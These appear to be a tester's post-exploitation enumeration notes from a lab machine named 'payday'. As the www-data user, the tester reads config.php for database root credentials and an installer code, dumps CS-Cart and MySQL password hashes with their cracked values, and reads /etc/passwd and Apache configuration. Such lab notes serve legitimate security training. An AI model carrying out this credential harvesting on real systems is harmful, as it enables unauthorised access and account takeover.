# 4 box enum www-data

```
www-data@payday:/var/www$ cat config.php

$db_host = 'localhost';
$db_name = 'cscart';
$db_user = 'root';
$db_password = 'root';

# in the end of file
// Authentication code to access the installator
$AUTH_CODE = '1NJC5M2E';

# mysql enum
# db: cscasrt
mysql> select user_login, password from cscart_users;
+------------+----------------------------------+
| user_login | password                         |
+------------+----------------------------------+
| admin      | 21232f297a57a5a743894a0e4a801fc3 |
| customer   | 91ec1f9324753048c0096d036a694f86 |
+------------+----------------------------------+
# admin:admin
# customer:customer

# db: mysql
mysql> select user, password from user;
+------------------+-------------------------------------------+
| user             | password                                  |
+------------------+-------------------------------------------+
| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| root             | *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |
| debian-sys-maint | *66C7454DEB04B50D88AC3B255B79B1CEE817961D |
+------------------+-------------------------------------------+
# root:root
# debian: not cracked

www-data@payday:/tmp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
[truncated]
klog:x:102:103::/home/klog:/bin/false
patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash

# looking at apache conf files has virtual hosts enabled
www-data@payday:/tmp$ cat /etc/apache2/sites-available/default
ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride None
                Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
Alias /doc/ "/usr/share/doc/"
    <Directory "/usr/share/doc/">
        Options Indexes MultiViews FollowSymLinks
        AllowOverride None
        Order deny,allow
        Deny from all
        Allow from 127.0.0.0/255.0.0.0 ::1/128
    </Directory>		
		
```
